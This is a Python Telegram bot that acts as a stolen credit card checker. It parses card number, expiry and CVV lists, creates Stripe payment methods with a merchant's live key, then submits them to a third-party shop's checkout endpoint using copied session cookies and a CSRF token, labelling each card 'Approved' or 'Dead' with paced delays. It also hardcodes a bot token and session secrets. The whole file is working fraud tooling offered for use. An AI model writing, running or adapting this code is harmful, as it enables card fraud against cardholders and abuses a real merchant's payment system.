import telebot
import requests
import re
import time
import threading
import json

BOT_TOKEN = "7194711538:AAHiP8JKzuhuJx72REyy6sMsRdttaPdvWAY"
bot = telebot.TeleBot(BOT_TOKEN)

# Global flag and lock for stopping the checking process
stop_flag = False
stop_lock = threading.Lock()

def parse_card_input(text):
    pattern = r'^(\d{12,19})[|/](\d{2})[|/](\d{2,4})[|/](\d{3,4})$'
    match = re.match(pattern, text.strip())
    if not match:
        return None
    cc, mm, yy, cvv = match.groups()
    if len(yy) == 4:
        yy = yy[2:]
    return cc, mm, yy, cvv

def check_single_card(card_text, chat_id):
    global stop_flag
    with stop_lock:
        if stop_flag:
            bot.send_message(chat_id, "🛑 Checking stopped by user.")
            return False  # Signal to stop processing

    card_data = parse_card_input(card_text)
    if not card_data:
        bot.send_message(chat_id, f"❌ Invalid format for card: `{card_text}`\nPlease use CC|MM|YY|CVV or CC|MM|YYYY|CVV", parse_mode='Markdown')
        return True

    cc, mm, yy, cvv = card_data

    stripe_url = "https://api.stripe.com/v1/payment_methods"
    stripe_payload = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': 'df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59',
        'muid': '6efd7584-fee8-409c-ba33-05d29099f4f5019d63',
        'sid': 'cfd57606-d22f-4f3f-b5f7-e2131ab32cf5b79697',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; card-element',
        'referrer': 'https://www.bloomingriders.com',
        'time_on_page': '129736',
        'key': 'pk_live_pikg8Knzv9oPKaFnRwcld8xQ'
    }

    try:
        stripe_resp = requests.post(stripe_url, data=stripe_payload, timeout=30)
        stripe_resp.raise_for_status()
        stripe_json = stripe_resp.json()
    except Exception as e:
        bot.send_message(chat_id, f"🔴 Error connecting to Stripe API for card `{card_text}`:\n{str(e)}")
        return True

    if 'error' in stripe_json:
        error_msg = stripe_json['error'].get('message', 'Unknown Stripe error')
        bot.send_message(chat_id, f"❌ Stripe error for card `{card_text}`: {error_msg}")
        return True

    pm_id = stripe_json.get('id')
    if not pm_id:
        bot.send_message(chat_id, f"❌ Failed to get payment method ID from Stripe for card `{card_text}`.")
        return True

    br_url = "https://www.bloomingriders.com/api/student/checkout/stripe/create-setup-intent"
    br_headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://www.bloomingriders.com',
        'referer': 'https://www.bloomingriders.com/checkout/?product_type=membership&product_id=1702',
        'x-country-code': 'IQ',
        'x-csrf-token': 'I3tRBBIz-XqI1FLslr2bsea5YXKkHRJKKN2g',
        'cookie': 'NEXT_LOCALE_V2=eyJtZXNzYWdlIjoiZGVmYXVsdCJ9; ruccd=s%3AeyJtZXNzYWdlIjoiSVEiLCJwdXJwb3NlIjoicnVjY2QifQ.l1Nc5QUSiaUxDqv9FSqzTLXC6u_LQNZbvLnFCfaShEA; swuid=s%3AeyJtZXNzYWdlIjoiY21hamxoOG80MDF2a2FrOW5kMnFwYjJ2ZCIsInB1cnBvc2UiOiJzd3VpZCJ9.ZZ8EZkLYw4jTun6GiWudxlUuL0xFSDMsbLijKZY0-Eo; __stripe_mid=6efd7584-fee8-409c-ba33-05d29099f4f5019d63; __stripe_sid=cfd57606-d22f-4f3f-b5f7-e2131ab32cf5b79697',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
    }
    br_json = {
        "stripe_payment_method_uuid": pm_id,
        "checkout_stat_id": 613838,
        "product_id": 1702,
        "product_type": "membership"
    }

    try:
        br_resp = requests.post(br_url, headers=br_headers, json=br_json, timeout=30)
        br_resp.raise_for_status()
        br_json_resp = br_resp.json()
    except Exception as e:
        bot.send_message(chat_id, f"🔴 Error connecting to Bloomingriders API for card `{card_text}`:\n{str(e)}")
        return True

    full_response = json.dumps(br_json_resp, indent=2, ensure_ascii=False)

    if "error" in br_json_resp:
        result_msg = f"❌ Card Declined (Dead) for `{card_text}`\nError: {br_json_resp['error']}\n\nFull response:\n{full_response}"
    else:
        result_msg = f"✅ Card Approved (Success) for `{card_text}`\n\nFull response:\n{full_response}"

    bot.send_message(chat_id, result_msg)
    return True

def process_cards(cards, chat_id):
    global stop_flag
    with stop_lock:
        stop_flag = False  # Reset stop flag at start

    for idx, card in enumerate(cards):
        with stop_lock:
            if stop_flag:
                bot.send_message(chat_id, "🛑 Checking stopped by user.")
                break

        card = card.strip()
        if not card:
            continue

        proceed = check_single_card(card, chat_id)
        if not proceed:
            break

        # Delay 15 seconds between cards except after last card or if stopped
        if idx != len(cards) - 1:
            for _ in range(15):
                with stop_lock:
                    if stop_flag:
                        bot.send_message(chat_id, "🛑 Checking stopped by user.")
                        return
                time.sleep(1)

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message,
        "Send me one or multiple cards to check.\n"
        "Use format per card:\nCC|MM|YY|CVV or CC|MM|YYYY|CVV\n"
        "Separate multiple cards by new lines.\n\n"
        "Example:\n4111111111111111|12|25|123\n5555555555554444|11|2026|456\n\n"
        "Send /stop to immediately stop ongoing checks.")

@bot.message_handler(commands=['stop'])
def stop_checking(message):
    global stop_flag
    with stop_lock:
        stop_flag = True
    bot.reply_to(message, "🛑 Received stop command. Stopping checks as soon as possible...")

@bot.message_handler(func=lambda m: True)
def handle_cards(message):
    cards = message.text.strip().split('\n')
    if len(cards) == 0:
        bot.reply_to(message, "❌ No cards found in your message.")
        return

    threading.Thread(target=process_cards, args=(cards, message.chat.id), daemon=True).start()

bot.polling()
